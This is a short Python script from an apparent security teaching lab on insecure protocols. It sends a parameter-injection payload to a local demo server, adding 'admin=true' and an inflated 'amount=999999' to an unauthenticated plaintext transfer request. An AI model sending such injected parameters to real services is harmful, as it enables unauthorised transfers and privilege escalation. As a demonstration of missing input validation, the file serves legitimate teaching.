# stage1_insecure_protocols/4_parameter_injection/attacker.py

"""
attacker.py - Insecure Protocol Demo (Parameter Injection Exploit)

This attacker crafts a malicious plaintext request to exploit parameter injection.
By altering or injecting fields (e.g., changing amount, adding admin=true),
the attacker bypasses logic in an unauthenticated system.

Vulnerabilities demonstrated:
- No input validation
- No authentication
- Blind trust in parameter structure

Usage:
    python attacker.py --port 9000
"""

import argparse

from config import DEFAULT_HOST

from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="The port to connect to")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# Construct a parameter injection payload to exploit lack of input validation
plain_text = "username=attacker&action=transfer&amount=999999&admin=true"
malicious_message = "username=attacker&action=transfer&amount=999999&admin=true"

# Send the malicious payload to the vulnerable server
response = run_tcp_attack(
    host=server_host,
    port=server_port,
    plain_text=plain_text,
    payload=malicious_message,
    verbose=True
)

print()